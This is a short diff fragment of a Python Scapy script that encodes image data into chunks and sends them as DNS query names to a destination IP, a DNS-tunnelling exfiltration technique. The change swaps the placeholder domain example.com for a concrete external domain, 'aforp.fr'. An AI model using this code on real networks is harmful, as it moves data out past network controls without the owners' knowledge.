@@ -14,7 +14,7 @@ def encode_image_data(image_path):
 
 def send_dns_query(dst_ip, encoded_chunk):
     response = sr1(IP(dst=dst_ip)/UDP(dport=53)/DNS(rd=1,
-                   qd=DNSQR(qname=encoded_chunk + b".example.com")), timeout=2)
+                   qd=DNSQR(qname=encoded_chunk + b"aforp.fr")), timeout=2)
     return response
 
 
